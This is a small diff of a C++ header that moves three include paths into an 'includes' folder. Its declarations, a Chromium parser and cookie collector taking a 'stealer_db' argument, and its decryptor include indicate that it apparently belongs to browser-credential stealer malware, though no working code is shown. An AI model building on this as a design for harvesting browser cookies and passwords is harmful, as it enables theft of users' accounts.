@@ -1,9 +1,9 @@
 #ifndef CHROMIUMPARSER_H
 #define CHROMIUMPARSER_H
 
-#include "DataHolder.h"
-#include "DataDump.h"
-#include "ChromiumDecryptor.h"
+#include "includes\DataHolder.h"
+#include "includes\DataDump.h"
+#include "includes\ChromiumDecryptor.h"
 
 BOOL chromium_parser(std::string username, std::string stealer_db);
 BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
